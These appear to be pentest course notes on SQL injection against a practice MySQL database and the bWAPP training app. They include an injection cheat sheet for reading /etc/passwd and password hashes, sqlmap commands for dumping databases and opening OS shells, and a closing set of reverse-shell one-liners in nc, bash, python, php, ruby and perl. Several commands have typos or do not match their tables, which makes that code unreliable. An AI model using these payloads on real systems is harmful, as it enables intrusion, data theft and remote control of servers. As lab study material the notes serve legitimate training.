# SQL-I in the Wild and the Convictions Recently of the Fiannce Website People
----
[Hackers sentenced for SQL Injections costing $300mn](https://nakedsecurity.sophos.com/2018/02/19/hackers-sentenced-for-sql-injections-that-cost-300-million/)
Old Breach, once the largest in the world for credit card numbers associated with the Heartland Payment System, finally has justice dealt to the hackers who dumped the data. 

[International Hackers Steal Press Releases utilizing SQL-I and other attacks](https://www.theverge.com/2018/8/22/17716622/sec-business-wire-hack-stolen-press-release-fraud-ukraine)
Classic story of hackers trying to make a quick, extorionary buck

[The History of SQL-I](https://motherboard.vice.com/en_us/article/aekzez/the-history-of-sql-injection-the-hack-that-will-never-go-away)
Little did we know what "piggybacking" SQL commands would lead to the a top-tier vulnerability across all platforms ( don't google SQL-I and mobile devices before bed ) 


----

# SQL.pdf
----

----
# MySql Data Base Construction
----
starting the mysql service
`apt-get isntall mysql-server`
`systemctl start mysql`

create the databse and use it
`mysql -u root`
`create dataetbase hackeru;`
`use hackeru;`

create 2 tables: 1 is users and the other is weapons
`create table users (id int(15), username varachar(15), password varachar(15), country varchar(15), fruit varchar(15));`
`create table weapons (id int(15), username varachar(15), password varachar(15), country varchar(15), fruit varchar(15));`


inset 5 rows each into the tables

`inset into weapons (id ,username , password , country , fruit ) values ("1", "tom", "usa", "mango");`

Show your data

`SELECT * FROM users;`
`SELECT * From weapons;`

----
# MySql DataBase Injection
---
show a column using a where statement
` select * from users where id="1";`

show a column using a where statement that is incorrect
` select * from users where id="-1";`

show a certain column using the where statement that is incorrect and bypassing it with an OR statement
`select * from users where id="-1" or 1=1;`

Use an order by to enumerate the columns in the database
`select * from users order by 1,2,3,4,5,6,7,8;`

use an union all to select new statement
`select * from users where id union all select version(), user(), database(),4,5;`

use INTO OUTFILE to redirect the data to a file
`select * from users INTO OUTFILE '/tmp/database.txt';`
----

## MYSQL DATABASE Injection Cheat Sheet
---

There are some of the queries below that only the `admin` user can run; in those situations use the `-- priv` flag from mysql

| What I want to get| |Command to Run|
| | ||

|Version| 	|SELECT @@version|
|Comments| 	|SELECT 1; #comment|
|Current User| 	|SELECT user();|
|Current User|		|	|SELECT system_user();|
|List Users| 	|SELECT user FROM mysql.user; — priv|
|List Password Hashes| 	|SELECT host, user, password FROM mysql.user; — priv|
|List DBA Accounts| |	SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv|
|Current Database| 	|SELECT database()|
|List Databases| 	|SELECT schema_name FROM information_schema.schemata; | 
|for MySQL >= v5.0|SELECT distinct(db) FROM mysql.db — priv|

|Avoiding Quotes| 	|SELECT 0×414243; # returns ABC|
|Time Delay| 	|SELECT BENCHMARK(1000000,MD5(‘A’));|
|# >= 5.0.12		|	|SELECT SLEEP(5); # >= 5.0.12|

|Local File Access| |	…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.|
|Local FileAccess | |SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system|
|Hostname, IP Address| 	|SELECT @@hostname;|
|Create Users| 	|CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv|
|Delete Users| 	|DROP USER test1; — priv|Make User DBA| 	|GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv|
|Location of DB files| 	|SELECT @@datadir;|

----
# Zixem Website Game
----
   
                                 
   
   
   
                                             
   
   
   
                                          
   
----

# BuggyWebApp (SEARCH/GET)
----
Take the above commands and compromise the buggy web app mysql server in the search/get game



# sqlmap and saving requests with burpsuit
----
SQLmap is an automated pentesting tool written in python customized for sqlI. 

SQLmap has a bunch of commands inside of it to make it quite effective as a pentesting tool
Most frameworks, like kali, will have it preinstalled if not you can install it using `git`

`sudo apt-get install git` followed by `git clone https://github.com/sqlmapproject/sqlmap.git`

SQLmap has a large amount of flags and commands that make it a highly effective pentesting tool

## Always useful help flags

```
-h      Show basic help
-hh     Show advanced help
--version
-v VERBOSE
```
### Verbosity
----

    0: Show only Python tracebacks, error and critical messages.
    1: Show also information and warning messages.
    2: Show also debug messages.
    3: Show also payloads injected.
    4: Show also HTTP requests.
    5: Show also HTTP responses' headers.
    6: Show also HTTP responses' page content.

Decent levels of verbosity to understand sqlmap does is level 2, primarily for detection, to see the SQL payloads the tools sends, level 3 is best. This level is also recommended to be used when you feed the developers with a potential bug report, you can send output the traffic log file generated with option -t as well


## Target Specific Flags
---
**ONE OF THESE MUST BE SET** so SQLmap knows who or what to target

```
    -d DIRECT           Connection string for direct database connection
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -c CONFIGFILE       Load options from a configuration INI file
```

**-d**
`DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME`

**-m**
```
www.thisIsmyFirstTarget.com
www.thisisSecondTarget.com
www.thisismyThirdTarget.com
www.target.com/they-fell-for-it-once
```


## Request Specific Flags
----
These are options on how to connect to the target

```
--cookie=COOKIE			HTTP Cookie Header value
--proxy=PROXY			Use a proxy to connect to the target URL
--tor					Use Tor anonymity network
```

## Optimization Flags
----
```
--treads=THREADS		Max number of concurrent HTTP requests
```

## Injection
----
These are specific options to test for, custom injection payloads, or tamering scripts
```
--dbms=DBMS
--os=OS
```

## Enumeration:
----
    These options can be used to print out the database
    system information, structure and data
    
```
    -a, --all           Retrieve everything
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
```
these options are for traversing a database or table once you have it's name
```
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --sql-query=QUERY   SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
```

## Brute force:
---
    These options can be used to run brute force checks
```
    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns
```

## Operating system access:
---
    These options can be used to access the back-end database management
    system underlying operating system
```
    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-bof            Stored procedure buffer overflow exploitation
```
On MySQL and PostgreSQL, sqlmap uploads (via the file upload functionality explained above) a shared library (binary file) containing two user-defined functions, sys_exec() and sys_eval(), then it creates these two functions on the database and calls one of them to execute the specified command, depending on user's choice to display the standard output or not



# BuggyWebApp (SEARCH/GET)

Then use BurpSuit to compromise the request; and use `sqlmap` to enumerate the databases

#### SQLMAP Enumeration command
----
`sqlmap -r fileName --dbs`
`sqlmap -r fileName -D bWAPP --tables`
`sqlmap -r fileName -D bWAPP -T users --columns`
`sqlmap -r fileName --dump-all`
`sqlmap -r fileName --sql-shell`
`sqlmap -r fileName --os-shell`
`sqlmap -r fileName --os-command=nc -e /bin/sh 0.0.0.0 8080`

Try to connect a shell; Reverse Shell examples are below

NetCat
```
nc -e /bin/sh 0.0.0.0 8080
```

bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

python2.7
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

php
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("bin/sh -i <&3 >&3 2>&3");'
```

ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
